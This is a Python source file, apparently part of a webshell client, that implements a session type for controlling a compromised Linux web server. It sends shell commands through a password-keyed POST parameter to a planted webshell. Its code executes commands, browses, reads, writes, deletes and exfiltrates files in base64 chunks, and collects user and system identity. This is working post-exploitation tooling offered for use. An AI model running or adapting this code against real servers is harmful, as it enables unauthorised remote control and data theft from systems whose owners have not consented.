import asyncio
import typing as t
import logging
import base64
import shlex
import hashlib
import httpx

from ..core import exceptions

from ..core.base import (
    register_session,
    ConnOption,
    ConnOptionGroup,
    DirectoryEntry,
    BasicInfoEntry,
    get_http_client,
)

from ..utils.random_data import random_string

logger = logging.getLogger("core.sessions.linux_cmd_oneliner")

WRAPPER_CODE = """
echo "{start1}""{start2}";
({code})
echo {stop}
"""

UPLOAD_FILE_CHUNK_CODE = """
file=`mktemp`
echo {chunk_b64} | base64 -d > $file
echo DONE "$file"
""".strip()

UPLOAD_FILE_MERGE_CODE = """
cat {files} > {filepath}
rm {files}
"""

UPLOAD_FILE_CHECK_CODE = """
which md5sum >/dev/null || echo no_md5sum
md5sum {filepath} 
"""

DOWNLOAD_FILE_CHUNK_CODE = """
tail -c +{offset} {filepath} | head -c {chunk_size} | base64 -w 0 || echo "#"FAILED
"""

GET_BASICINFO_CODE = """
for cmd in {cmds}
do
  echo "start$cmd|"$($cmd | base64 -w 0)"stop"
done
"""


def shell_command(args: t.List[str]):
    """转译命令或命令参数"""
    return " ".join(shlex.quote(arg) for arg in args)


def parse_file_permission(perm: str):
    result = ""
    for i in range(0, 9, 3):
        part = perm[i : i + 3]
        digit_bin = "".join("0" if c == "-" else "1" for c in part)
        result += str(int(digit_bin, 2))
    return result


@register_session
class LinuxCmdOneLiner:
    session_type = "LINUX_CMD_ONELINER"
    readable_name = "Linux命令执行"
    conn_options: t.List[ConnOptionGroup] = [
        {
            "name": "基本连接配置",
            "options": [
                ConnOption(
                    id="url",
                    name="地址",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                ConnOption(
                    id="password",
                    name="密码",
                    type="text",
                    placeholder="cmd",
                    default_value=None,
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "高级连接配置",
            "options": [
                ConnOption(
                    id="https_verify",
                    name="验证HTTPS证书",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
            ],
        },
    ]

    def __init__(self, session_conn: dict):
        # super().__init__(session_conn)
        self.url = session_conn["url"]
        self.password = session_conn["password"]
        self.https_verify = session_conn.get("https_verify", False)
        self.client = get_http_client(verify=self.https_verify)

    async def execute_cmd(self, cmd):
        return await self.submit(cmd)

    async def test_usablility(self):
        toprint = random_string(12)
        return toprint in (await self.submit(["echo", toprint]))

    async def get_pwd(self):
        return (await self.submit("pwd")).strip()

    async def _list_dir(self, dir_path) -> t.List[DirectoryEntry]:
        # 不仅列出文件夹，在给定的是文件时给出文件的详细信息

        # yes, we are parsing output of `ls`, although we shoudn't
        command_output = await self.submit(
            shell_command(["ls", "-la", dir_path]) + " && echo finished"
        )
        result = []
        if "finished" not in command_output:
            return None
        for line in command_output.splitlines():
            parts = line.split(maxsplit=8)
            if len(parts) < 9:
                continue
            perm = parts[0]
            filesize = parts[4]
            name = parts[8]  # it would be `aaa -> bbb` when it is symlink

            try:
                filesize = int(filesize)
            except Exception as exc:
                raise exceptions.FileError("无法解析文件大小") from exc

            filetype = perm[0]
            perm = parse_file_permission(perm[1:10])
            filetype = {"f": "file", "d": "dir", "l": "link"}.get(filetype, "unknown")
            if filetype == "link":
                filetype == "link-dir" if name.endswith("/") else "link-file"
                name = name.split(" ->")[0]
            result.append(
                DirectoryEntry(
                    name=name,
                    permission=perm,
                    filesize=int(filesize),
                )
            )
        return result

    async def list_dir(self, dir_path) -> t.List[DirectoryEntry]:
        result = await self._list_dir(dir_path)
        if result:
            return result
        return [
            DirectoryEntry(name="..", permission="555", filesize=-1, entry_type="dir")
        ]

    async def mkdir(self, dir_path):
        result = await self.submit(
            shell_command(["mkdir", dir_path]) + " && echo finished"
        )
        if result.strip() != "finished":
            raise exceptions.FileError("创建文件夹失败")

    async def get_file_contents(self, filepath: str, max_size: int = 1024 * 200):
        ls_result = await self.list_dir(filepath)
        if not ls_result or ls_result[0].filesize > max_size:
            raise exceptions.FileError(f"文件大小太大(>{max_size}B)，建议下载编辑")
        content_b64 = await self.submit(["base64", "-w", "0", filepath])
        return base64.b64decode(content_b64)

    async def put_file_contents(self, filepath: str, content: bytes):
        content_b64 = base64.b64encode(content).decode()
        cmd = (
            f"{shell_command(['echo', content_b64])} | "
            + f"base64 -d > {shlex.quote(filepath)} && echo finished"
        )
        result = await self.submit(cmd)
        return result.strip() == "finished"

    async def delete_file(self, filepath: str):
        cmd = shell_command(["rm", filepath]) + " && echo finished"
        result = await self.submit(cmd)
        return result.strip() == "finished"

    async def move_file(self, filepath, new_filepath):
        cmd = shell_command(["mv", filepath, new_filepath]) + " && echo finished"
        result = await self.submit(cmd)
        if result.strip() != "finished":
            raise exceptions.FileError("移动失败")

    async def upload_file(self, filepath, content, callback):
        result_touch = await self.submit(
            shell_command(["touch", filepath]) + " && echo finished"
        )
        if result_touch.strip() != "finished":
            raise exceptions.FileError("文件上传失败：无法新建文件")

        sem = asyncio.Semaphore(4)
        chunk_size = 1000
        done_coro = 0
        done_bytes = 0
        coros = []

        async def upload_chunk(chunk: bytes):
            nonlocal done_coro, done_bytes
            code = UPLOAD_FILE_CHUNK_CODE.format(
                chunk_b64=base64.b64encode(chunk).decode()
            )
            async with sem:
                await asyncio.sleep(0.01)
                result = await self.submit(code)
                done_coro += 1
                done_bytes += len(chunk)
                if callback:
                    callback(
                        done_coro=done_coro,
                        max_coro=len(coros),
                        done_bytes=done_bytes,
                        max_bytes=len(content),
                    )
            if "DONE" not in result:
                raise exceptions.FileError("上传分块失败")

            return result.strip().removeprefix("DONE").strip()

        coros = [
            upload_chunk(content[i : i + chunk_size])
            for i in range(0, len(content), chunk_size)
        ]
        uploaded_chunks = await asyncio.gather(*coros)
        code = UPLOAD_FILE_MERGE_CODE.format(
            files=shell_command(uploaded_chunks), filepath=shlex.quote(filepath)
        )
        await self.submit(code)
        checkfile = await self.submit(
            UPLOAD_FILE_CHECK_CODE.format(filepath=shlex.quote(filepath))
        )
        if "no_md5sum" in checkfile:
            return True  # we cannot check it
        if hashlib.md5(content).hexdigest() not in checkfile:
            raise exceptions.FileError("上传失败：MD5验证失败")
        return True

    async def download_file(self, filepath: str, callback=None):
        pass
        ls_result = await self.list_dir(filepath)
        if not ls_result:
            raise exceptions.FileError("读取文件大小失败，也许文件不存在？")
        filesize = ls_result[0].filesize

        # TODO: 允许用户自定义
        sem = asyncio.Semaphore(4)
        chunk_size = 1000
        done_coro = 0
        done_bytes = 0
        coros = []

        async def download_chunk(offset: int):
            nonlocal done_coro, coros, done_bytes
            # 这里的offset从1开始
            code = DOWNLOAD_FILE_CHUNK_CODE.format(
                offset=offset,
                filepath=shlex.quote(filepath),
                chunk_size=str(chunk_size),
            )
            async with sem:
                await asyncio.sleep(0.01)  # we don't ddos
                result = await self.submit(code)
                done_coro += 1
                done_bytes += chunk_size  # TODO: fix me
                if callback:
                    callback(
                        done_coro=done_coro,
                        max_coro=len(coros),
                        done_bytes=min(done_bytes, filesize),
                        max_bytes=filesize,
                    )
            if "#FAILED" in result:
                raise exceptions.FileError("无法读取文件") from exc
            try:
                return base64.b64decode(result.strip())
            except Exception as exc:
                raise exceptions.FileError("无法base64解码分块") from exc

        coros = [download_chunk(i) for i in range(1, filesize + 1, chunk_size)]
        chunks = await asyncio.gather(*coros)
        return b"".join(chunks)

    async def send_bytes_over_tcp(
        self,
        host: str,
        port: int,
        content: bytes,
        send_method: t.Union[str, None] = None,
    ) -> t.Union[bytes, None]:
        """把一串字节通过TCP发送到其他机器上，可以指定对应的发送方法"""
        raise exceptions.ServerError(
            "不支持此功能，你不会想用命令执行传HTTP吧？"
        )  # 可以是可以，用nc或者bash可以做，但是暂时不实现这个功能

    async def get_send_tcp_support_methods(self) -> t.List[str]:
        """得到发送字节支持的TCP方法"""
        return []

    async def get_basicinfo(self):
        # TODO: 多加一点命令
        cmds = ["uname -a", "whoami", "id", "groups", "pwd"]
        info = GET_BASICINFO_CODE.format(cmds=shell_command(cmds))
        result = []
        for line in (await self.submit(info)).splitlines():
            line = line.strip().removeprefix("start").removesuffix("stop")
            if "|" not in line:
                print(f"{line=}")
                continue
            cmd, output_b64 = line.split("|", maxsplit=1)
            try:
                output = base64.b64decode(output_b64.strip()).decode()
            except Exception:
                continue
            result.append(BasicInfoEntry(key=cmd, value=output))
        return result

    async def submit(self, payload: t.Union[str, t.List[str]]):
        start1, start2, stop = random_string(6), random_string(6), random_string(12)
        # we use f-string here because shell commands normally don't
        # has brackets unlike php code
        code = WRAPPER_CODE.format(
            start1=start1,
            start2=start2,
            code=payload if isinstance(payload, str) else shell_command(payload),
            stop=stop,
        )
        status_code, html = await self.submit_http(code)
        if status_code == 404:
            raise exceptions.TargetUnreachable(
                f"状态码404, 没有这个webshell: {status_code}"
            )
        if (start1 + start2) not in html:
            raise exceptions.PayloadOutputError(
                "找不到输出文本的开头，也许webshell没有执行代码？"
            )
        html_afterstarted = html[html.index(start1 + start2) + len(start1 + start2) :]
        if stop not in html_afterstarted:
            raise exceptions.PayloadOutputError(
                "找不到输出文本的结尾，也许webshell没有执行代码？"
            )
        result = html_afterstarted[: html_afterstarted.index(stop)]
        return result.removeprefix("\n")

    async def submit_http(self, payload: t.Union[str, bytes]):
        try:
            response = await self.client.request(
                method="POST", url=self.url, data={self.password: payload}
            )
            return response.status_code, response.text
        except httpx.TimeoutException as exc:
            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError("发送HTTP请求到受控端失败") from exc
